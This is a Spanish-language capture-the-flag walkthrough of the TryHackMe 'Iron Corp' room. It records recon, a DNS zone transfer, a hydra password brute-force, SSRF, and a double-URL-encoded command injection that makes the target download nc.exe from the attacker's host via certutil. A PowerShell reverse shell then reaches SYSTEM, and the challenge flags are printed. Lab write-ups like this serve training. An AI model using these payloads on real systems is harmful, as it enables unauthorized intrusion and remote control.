---
tags:
title: Iron Corp - Hard (THM)
permalink: /Iron-Corp-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
zs1n@ptw ~> nmapf ironcorp.me -Pn
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 16:50 -0400
Initiating SYN Stealth Scan at 16:50
Scanning ironcorp.me (10.64.181.147) [65535 ports]
Discovered open port 8080/tcp on 10.64.181.147
Discovered open port 53/tcp on 10.64.181.147
Discovered open port 135/tcp on 10.64.181.147
Discovered open port 3389/tcp on 10.64.181.147
Discovered open port 49668/tcp on 10.64.181.147
Discovered open port 11025/tcp on 10.64.181.147
Completed SYN Stealth Scan at 16:50, 20.02s elapsed (65535 total ports)
Nmap scan report for ironcorp.me (10.64.181.147)
Host is up, received user-set (0.18s latency).
rDNS record for 10.64.181.147: ironcorp.htm
Scanned at 2026-03-27 16:50:28 EDT for 20s
Not shown: 65529 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON
53/tcp    open  domain        syn-ack ttl 126
135/tcp   open  msrpc         syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126
8080/tcp  open  http-proxy    syn-ack ttl 126
11025/tcp open  unknown       syn-ack ttl 126
49668/tcp open  unknown       syn-ack ttl 126

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.10 seconds
           Raw packets sent: 196607 (8.651MB) | Rcvd: 33 (1.612KB)
-e [*] IP: 10.64.181.147
[*] Puertos abiertos: 53,135,3389,8080,11025,49668
/usr/bin/xclip
-e [*] Service scanning with nmap against 53,135,3389,8080,11025,49668 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 16:50 -0400
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.76 seconds
zs1n@ptw ~> sudo nmap -sVC -p53,135,3389,8080,11025,49668 ironcorp.me -Pn
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 16:53 -0400
Nmap scan report for ironcorp.me (10.64.181.147)
Host is up (0.17s latency).
rDNS record for 10.64.181.147: ironcorp.htm

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-03-27T20:54:15+00:00; -7s from scanner time.
| ssl-cert: Subject: commonName=WIN-8VMBKF3G815
| Not valid before: 2026-03-26T20:40:00
|_Not valid after:  2026-09-25T20:40:00
| rdp-ntlm-info:
|   Target_Name: WIN-8VMBKF3G815
|   NetBIOS_Domain_Name: WIN-8VMBKF3G815
|   NetBIOS_Computer_Name: WIN-8VMBKF3G815
|   DNS_Domain_Name: WIN-8VMBKF3G815
|   DNS_Computer_Name: WIN-8VMBKF3G815
|   Product_Version: 10.0.14393
|_  System_Time: 2026-03-27T20:54:06+00:00
8080/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/10.0
11025/tcp open  http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4)
|_http-title: Coming Soon - Start Bootstrap Theme
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
49668/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -7s, deviation: 0s, median: -8s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.04 seconds
```
## Website

Las paginas principales parecen ser estaticas.

![image-center](/assets/images/Pasted image 20260327174937.png)
### Other website

Esta por lo tanto tambien.

![image-center](/assets/images/Pasted image 20260327175414.png)
### AXFR

Usando `dig` para realizar una transferencia de zona `(AXFR)`, descubrí unos subdominios adicionales.

```bash
zs1n@ptw ~> dig axfr @10.64.181.147 ironcorp.me

; <<>> DiG 9.20.20-1-Debian <<>> axfr @10.64.181.147 ironcorp.me
; (1 server found)
;; global options: +cmd
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
ironcorp.me.		3600	IN	NS	win-8vmbkf3g815.
admin.ironcorp.me.	3600	IN	A	127.0.0.1
internal.ironcorp.me.	3600	IN	A	127.0.0.1
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
;; Query time: 307 msec
;; SERVER: 10.64.181.147#53(10.64.181.147) (TCP)
;; WHEN: Fri Mar 27 17:06:00 EDT 2026
;; XFR size: 5 records (messages 1, bytes 238)
```
### Password spraying

Como en la web `admin.ironcorp.me` por el puerto 11025 me muestra un panel de autenticacion, estoy sin salida.

![image-center](/assets/images/Pasted image 20260327180836.png)
## Shell as system

Por lo que como la pagina, esta bajo el subdominio de `admin` use `hydra` para por fuerza bruta descubrir la contraseña de este panel.

```bash
zs1n@ptw ~> hydra -l admin -P /usr/share/wordlists/rockyou.txt admin.ironcorp.me -s 11025 http-get
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-27 17:11:23
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://admin.ironcorp.me:11025/
[11025][http-get] host: admin.ironcorp.me   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-27 17:12:20
```
### SSRF

Usando estas credenciales accedí al panel de administración en donde tengo un panel de búsqueda en donde después de probar distintas cosas descubrí que es vulnerable a `SSRF`, usando así el protocolo `file://` para poder leer archivos.

![image-center](/assets/images/Pasted image 20260327181606.png)
### Internal page

Ademas pude ver el contenido de el otro subdominio al cual no pude acceder de manera externa.

![image-center](/assets/images/Pasted image 20260327182227.png)

Viendo que el código fuente el mismo apuntaba a `/name.php?name=` viendo al usuario Equinox.

![image-center](/assets/images/Pasted image 20260327182305.png)
### Command injection

Usando el escape para ejecutar comandos `&` con un doble `url-encode`, el comando lo ejecutaba correctamente.

![image-center](/assets/images/Pasted image 20260327183156.png)
### Shell

Por lo que intente subir el `nc.exe` a la ruta `C:\programdata\`.

```bash
GET /?r=http://internal.ironcorp.me:11025/name.php?name=equinox%2526certutil.exe%2520-urlcache%2520-split%2520-f%2520http%253a%252f%252f192.168.210.140%252fnc.exe%2520C%253a%255cprogramdata%255cnc.exe
```

Exitosamente lo descargo.

```bash
zs1n@ptw ~> www
[eth0] 192.168.80.129
[docker0] 172.17.0.1
[tun0] 192.168.210.140
[/home/zsln/Desktop/zsln/IronCorp]
allPorts  ferox-http_ironcorp_me_8080_-1774645503.state  nc.exe  port_scan
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.64.181.147 - - [27/Mar/2026 17:37:01] "GET /nc.exe HTTP/1.1" 200 -
10.64.181.147 - - [27/Mar/2026 17:37:02] "GET /nc.exe HTTP/1.1" 200 -
```
### shell.ps1

Sin exito pude usar el mismo para poder enviarme una shell, asi que use el siguiente [script](https://gist.githubusercontent.com/11philip22/ff9a1279708f90c3166f04021624834c/raw/e65de6954e8b943eaa51adc8511ac66c2eb21bf3/shell.ps1) para una reverse shell pero en `PowerShell`, donde el mismo lo coloque en la ruta actual usando el siguiente comando.

```bash
certutil.exe <..snip..> .\script.ps1
```

Luego para ejecutarlo coloque el siguiente comando

```powershell
powershell.exe .\script.ps1
```

Recibiendo asi la shell como el usuario `system`.

```powershell
└─# rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.210.140] from (UNKNOWN) [10.64.173.116] 49762
PS E:\xampp\htdocs\internal> whoami
nt authority\system
PS E:\xampp\htdocs\internal>
```

```bash
PS C:\users\administrator\desktop> cat user.txt
thm{09b408056a13fc222f33e6e4cf599f8c}
```
### Deny restriction

Intentando ver la ultima flag en el directorio del usuario `superadmin`, no me dejaba acceder al directorio `\Desktop`. Esto debido a que si bien somos owner de la carpeta, el permiso `Deny FullControl`, esta por encima de un Allow, por lo que no me deja acceder al directorio, pero sabiendo que el nombre del archivo, lo puedo leer correctamente.

```powershell
PS C:\users\superadmin> type desktop\root.txt
thm{a1f936a086b367761cc4e7dd6cd2e2bd}
```

`~Happy Hacking`.